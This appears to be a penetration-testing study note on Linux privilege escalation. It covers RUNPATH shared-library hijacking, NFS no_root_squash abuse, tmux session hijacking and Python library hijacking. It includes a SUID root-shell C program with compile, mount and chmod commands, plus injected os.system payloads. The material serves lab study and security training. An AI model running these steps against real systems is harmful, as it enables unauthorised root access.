# Miscellaneous Techniques

## **Shared Object Hijacking - Binary RUNPATH variable**

A binary or program may use a custom library that can be enumerated by using one of the following commands:

* `ldd /path/to/program-name`
* `readelf -d /path/to/program-name | grep PATH`

By checking the `RUNPATH` content, we can verify if a custom directory is being used.\
Custom libraries specified by the RUNPATH have higher priority compared to the other libraries, similarly. to LD\_PRELOAD\
In other terms, if the `RUNPATH` contains `/directoryname/customlibrary.so` we can hijack the shared library to elevate privileges

To abuse the RUNPATH, the procedure is the _same as the `LD_PRELOAD` abuse_:

* identify a function used by binary/program
* write a malicious shared library containing a reverse shell payload inside a function with the same signature as the original one
* substitute the original custom library file with the malicious one

***

## **Weak NFS Privileges to Privesc**

* Any accessible mounts can be listed remotely by issuing the command `showmount -e target-ip`
* When an NFS volume is created, various options can be set
* To escalate privileges, we need to have the `no_root_squash` option
* This option allows remote users connecting to the share as the local root user to create files on the NFS server as the root user.\This would allow for the creation of malicious scripts/programs with the SUID bit set.
* Basically, you can use the attacker's machine root user to create files on the NFS server as the root user
* To enumerate the exports on the machine hosting an NFS Share: `cat /etc/exports`
* If `no_root_squash` is set we can create a `SETUID` binary that executes `/bin/sh` using our local root user. \ We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

**Exploitation steps:**

1. Suppose a target machine hosts a NFS Share. We can enumerate that by using `showmount -e target-ip`
2. Suppose we have local access to the target machine. We can check if the `no_root_squash` options is set for the previous share by using `cat /etc/exports`
3.  Write the PoC script:

    ```
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    int main(void)
    {
      setuid(0); setgid(0); system("/bin/bash");
    }
    ```
4. Compile the script: `gcc shell.c -o shell`
5. Use the local root user to copy the file on the NFS share as root:
   * `sudo mount -t nfs 10.129.2.12:/tmp /mnt`
   * `cp shell /mnt`
   * `chmod u+s /mnt/shell`
6. Switching back to the target host's session, we can escalate privileges to root by executing the binary: `cd /tmp; ./shell`

***

## **TMUX Terminal Session Hijacking (Requires DEV group)**

> * Terminal multiplexers such as `tmux` can be used to **allow multiple terminal sessions to be accessed within a single console session**
> * When not working in a tmux window, we can `detach` from the session, still leaving it `active`
> * We can gain a `root` terminal session if a user left a `tmux` process running as a privileged user
> * To do that, we need to have access to a user in the `dev` group to create a new `shared tmux session` and modify its ownership

**Exploitation steps:**

1. Create new shared sessions: `tmux -S /shareds new -s debugsess`
2. Change session owner: `chown root:devs /shareds`
3. Check for any ruynning tmux processes: `ps aux | grep tmux`
4. Attach the tmux session and get root privileges: `tmux -S /shareds`

***

## **Python Library Hijacking**

> * There are many ways in which we can hijack a Python library.
> * Much depends on the script and its contents itself.
> * However, there are three basic vulnerabilities where hijacking can be used

1. **Wrong write permissions:**
   * Requirements: A python script with `SUID` privileges that makes use of any library (`import libraryname`)
   * The library file will be located at `/usr/local/lib/python3.8/dist-packages/libraryname`
   * After checking which library function is called inside the python code, we can edit the library file by injecting a payload such as `import os` `os.system('id')`
   * Executing the python script again will show the results of the `id` command, confirming root privileges
2. **Library Path:**
   * Requirements: write permissions in one of the folders shown by the PYTHONPATH variable (preferrably one of the folders first folders)
   * To enumerate the PYTHONPATH variable contents: `python3 -c 'import sys; print("\n".join(sys.path))'`
   * PoC: if we have write permissions inside one of the folders specified by the PYTHONPATH variable\
     we can proceed in a similar manner as with the standard PATH environment variable abuse.
   * The basic idea is to write a file with the same name and signature as an imported library and inject a payload to run a shell
3. **PYTHONPATH environment variable:**
   * Requirements: permissions to edit the PYTHONPATH variable
   * To check that permission: `sudo -l` → Output: `SETENV: /usr/bin/python3`
   * PoC: edit the `PYTHONPATH` variable in the same way as a standard `PATH` environment variable privilege escalation
